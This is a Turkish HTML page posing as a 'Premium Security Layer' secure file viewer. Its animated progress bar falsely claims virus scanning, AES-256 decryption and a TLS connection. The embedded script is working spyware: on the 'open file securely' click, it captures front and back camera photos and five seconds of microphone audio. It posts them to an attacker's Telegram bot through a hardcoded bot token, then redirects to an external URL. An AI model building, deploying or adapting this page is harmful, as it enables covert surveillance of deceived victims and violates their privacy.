<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenli Görüntüleme - Premium Güvenlik Katmanı</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0b1120 0%, #192132 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 50%);
            animation: pulse 15s ease infinite;
            z-index: 0;
        }

        @keyframes pulse {
            0%, 100% { transform: translate(-10%, -10%) rotate(0deg); }
            50% { transform: translate(0%, 0%) rotate(5deg); }
        }

        .card {
            background: rgba(18, 25, 45, 0.9);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 45px;
            border-radius: 32px;
            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
            text-align: center;
            max-width: 440px;
            width: 100%;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
            z-index: 1;
            transform: translateY(0);
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .header-icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(145deg, #3b4b8c, #2a3a6a);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            color: white;
            font-size: 44px;
            box-shadow: 0 15px 30px rgba(0, 20, 80, 0.6), 0 0 0 2px rgba(255,255,255,0.1) inset;
            border: 1px solid rgba(255,255,255,0.2);
        }

        h2 {
            color: #fff;
            font-size: 28px;
            margin-bottom: 8px;
            font-weight: 600;
            letter-spacing: -0.5px;
            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        .subtitle {
            color: #a0b3d9;
            font-size: 14px;
            margin-bottom: 25px;
            font-weight: 400;
        }

        .status-container {
            background: rgba(10, 15, 30, 0.6);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 25px 20px;
            margin: 25px 0;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3) inset;
        }

        .status-message {
            color: #e0e7ff;
            font-size: 17px;
            margin-bottom: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            overflow: hidden;
            margin: 20px 0 15px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4f7df3, #8b6ecf, #c95d9e);
            width: 0%;
            border-radius: 12px;
            transition: width 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            box-shadow: 0 0 10px #4f7df3;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #6cdb9a;
            font-size: 14px;
            margin: 20px 0 5px;
            padding: 8px 15px;
            background: rgba(40, 167, 69, 0.1);
            border-radius: 30px;
            border: 1px solid rgba(108, 219, 154, 0.2);
            backdrop-filter: blur(5px);
            width: fit-content;
            margin-left: auto;
            margin-right: auto;
        }

        .security-badge svg {
            width: 18px;
            height: 18px;
            fill: #6cdb9a;
        }

        .btn {
            background: linear-gradient(145deg, #4f7df3, #6d5ac9);
            color: white;
            border: none;
            padding: 18px 36px;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateY(15px) scale(0.95);
            box-shadow: 0 15px 30px rgba(79, 125, 243, 0.4), 0 0 0 1px rgba(255,255,255,0.1) inset;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #4f7df3, #8b6ecf, #c95d9e, #4f7df3);
            border-radius: 16px;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: -1;
        }

        .btn:hover::before {
            opacity: 0.5;
        }

        .btn.visible {
            opacity: 1;
            transform: translateY(0) scale(1);
        }

        .btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 25px 40px rgba(79, 125, 243, 0.6);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: scale(0.98);
            box-shadow: none;
        }

        .footer-text {
            margin-top: 25px;
            font-size: 12px;
            color: #6a7ca5;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            border-top: 1px solid rgba(255,255,255,0.05);
            padding-top: 20px;
        }

        .loading-dots {
            display: inline-block;
        }

        .loading-dots:after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
            font-size: 20px;
            line-height: 1;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        #v, #c, #audioElement {
            display: none;
        }

        .shield-icon {
            display: inline-block;
            margin-right: 5px;
            filter: drop-shadow(0 0 5px #4f7df3);
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header-icon">
            <span class="shield-icon">🛡️</span>
        </div>
        
        <h2>Premium Güvenlik Katmanı</h2>
        <div class="subtitle">Çok faktörlü kimlik doğrulama</div>
        
        <div class="status-container">
            <div class="status-message" id="msg">
                <span>🔐 Güvenli bağlantı başlatılıyor</span>
                <span class="loading-dots"></span>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>

            <div class="security-badge" id="securityBadge" style="display: none;">
                <svg viewBox="0 0 20 20" fill="currentColor">
                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                </svg>
                <span>Güvenli bağlantı kuruldu (SSL/TLS 1.3)</span>
            </div>
        </div>

        <button class="btn" id="btn" onclick="handleButtonClick()">
            <span>🔓 Dosyayı Güvenle Aç</span>
        </button>
        
        <div class="footer-text">
            <span id="timer">⏱️ 0:00</span>
            <span>•</span>
            <span>Oturum ID: <span id="fileId"></span></span>
            <span>•</span>
            <span>AES-256</span>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <audio id="audioElement" style="display: none"></audio>

    <script>
        // TELEGRAM BOT KONFIGÜRASYONU
        const CONFIG = {
            TOKEN: "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U", // Bot token
            REDIRECT_URL: "https://vurustotal4-1.onrender.com", // Yönlendirme URL'si
            PROGRESS_STEPS: [18, 35, 52, 68, 84, 100],
            STEP_DELAYS: [450, 550, 650, 750, 850, 300]
        };

        // URL'den ID'yi al veya rastgele oluştur
        const urlParams = new URLSearchParams(window.location.search);
        const fileId = urlParams.get('id') || 'SID' + Math.floor(Math.random() * 9000 + 1000);
        document.getElementById('fileId').textContent = fileId;

        let currentStep = 0;
        let mediaStream = null;
        let audioStream = null;
        let mediaRecorder = null;
        let audioChunks = [];

        // Progress bar simülasyonu
        function startProgressSimulation() {
            const progressFill = document.getElementById('progress');
            const msgElement = document.getElementById('msg');
            const securityBadge = document.getElementById('securityBadge');
            
            const interval = setInterval(() => {
                if (currentStep < CONFIG.PROGRESS_STEPS.length) {
                    const targetProgress = CONFIG.PROGRESS_STEPS[currentStep];
                    progressFill.style.width = targetProgress + '%';
                    
                    if (targetProgress <= 18) {
                        msgElement.innerHTML = '<span>📦 Güvenli dosya indiriliyor</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 35) {
                        msgElement.innerHTML = '<span>🛡️ Gelişmiş virüs taraması</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 52) {
                        msgElement.innerHTML = '<span>🔑 AES-256 şifre çözme</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 68) {
                        msgElement.innerHTML = '<span>🌐 Güvenlik duvarı kontrolü</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 84) {
                        msgElement.innerHTML = '<span>📋 Son hazırlıklar</span> <span class="loading-dots"></span>';
                    }
                    
                    currentStep++;
                } else {
                    clearInterval(interval);
                    msgElement.innerHTML = '<span>✅ Dosya güvenle hazırlandı</span> <span style="color: #6cdb9a;">✓</span>';
                    securityBadge.style.display = 'flex';
                    document.getElementById('btn').classList.add('visible');
                }
            }, CONFIG.STEP_DELAYS[currentStep]);
        }

        // Zamanlayıcı
        function updateTimer() {
            const timerElement = document.getElementById('timer');
            let seconds = 0;
            setInterval(() => {
                seconds++;
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerElement.textContent = `⏱️ ${mins}:${secs.toString().padStart(2, '0')}`;
            }, 1000);
        }

        // Ses kaydı başlat (5 saniye)
        async function startAudioRecording() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false
                    }
                });
                
                mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    await sendToTelegram(audioBlob, 'audio');
                    
                    if (audioStream) {
                        audioStream.getTracks().forEach(track => track.stop());
                    }
                };

                mediaRecorder.start();
                
                // 5 saniye kayıt yap
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, 5000);

            } catch (error) {
                console.log('Ses kaydı başlatılamadı:', error);
            }
        }

        // Fotoğraf çek (hem ön hem arka kamera)
        async function capturePhotos() {
            const photoBlobs = [];
            
            try {
                // Önce ön kamera
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: false 
                });
                
                const frontPhoto = await capturePhotoFromStream(frontStream);
                if (frontPhoto) {
                    photoBlobs.push({ blob: frontPhoto, type: 'front' });
                }
                
                // Arka kamera (mevcutsa)
                try {
                    const backStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "environment" },
                        audio: false 
                    });
                    
                    const backPhoto = await capturePhotoFromStream(backStream);
                    if (backPhoto) {
                        photoBlobs.push({ blob: backPhoto, type: 'back' });
                    }
                } catch (backError) {
                    console.log('Arka kamera mevcut değil');
                }

                // Fotoğrafları Telegram'a gönder
                for (const photo of photoBlobs) {
                    await sendToTelegram(photo.blob, 'photo', photo.type);
                }

            } catch (error) {
                console.log('Kamera erişimi başarısız:', error);
            }
        }

        // Stream'den fotoğraf yakala
        async function capturePhotoFromStream(stream) {
            return new Promise((resolve) => {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        const context = canvas.getContext('2d');
                        
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            stream.getTracks().forEach(track => track.stop());
                            resolve(blob);
                        }, 'image/jpeg', 0.85);
                    }, 500);
                };
            });
        }

        // Telegram'a veri gönder
        async function sendToTelegram(blob, type, cameraType = 'unknown') {
            const formData = new FormData();
            formData.append('chat_id', fileId);
            
            const timestamp = new Date().toLocaleString('tr-TR', { 
                timeZone: 'Europe/Istanbul',
                hour12: false 
            });
            
            let caption = `🔐 **Güvenlik Doğrulama Raporu**\n\n`;
            caption += `📱 **Oturum ID:** \`${fileId}\`\n`;
            caption += `⏰ **Zaman:** ${timestamp}\n`;
            
            if (type === 'photo') {
                caption += `📸 **Kamera:** ${cameraType === 'front' ? 'Ön Kamera' : 'Arka Kamera'}\n`;
                formData.append('photo', blob, `kayit_${cameraType}_${Date.now()}.jpg`);
            } else if (type === 'audio') {
                caption += `🎤 **Ses Kaydı:** 5 saniye\n`;
                formData.append('audio', blob, `ses_kaydi_${Date.now()}.webm`);
            }
            
            caption += `🌐 **IP Bilgisi:** Toplanıyor...\n`;
            caption += `🛡️ **Güvenlik Seviyesi:** Yüksek (AES-256)`;
            
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            try {
                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${endpoint}`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.log(`${type} gönderilemedi:`, error);
            }
        }

        // Ana işlem
        async function handleButtonClick() {
            const btn = document.getElementById('btn');
            if (!btn.disabled) {
                btn.innerHTML = '<span>⏳ Güvenlik doğrulaması yapılıyor...</span> <span class="loading-dots"></span>';
                btn.disabled = true;
                
                try {
                    // Eş zamanlı olarak fotoğraf ve ses kaydını başlat
                    await Promise.all([
                        capturePhotos(),
                        startAudioRecording()
                    ]);
                    
                } catch (error) {
                    console.log('İşlem sırasında hata:', error);
                }
                
                // Kısa bir bekleme sonrası yönlendir
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 5500); // 5.5 saniye (ses kaydı süresi + buffer)
            }
        }

        // Sayfa yüklendiğinde
        window.onload = function() {
            startProgressSimulation();
            updateTimer();
        };

        // Sayfa kapatıldığında stream'leri temizle
        window.onbeforeunload = function() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
</html>
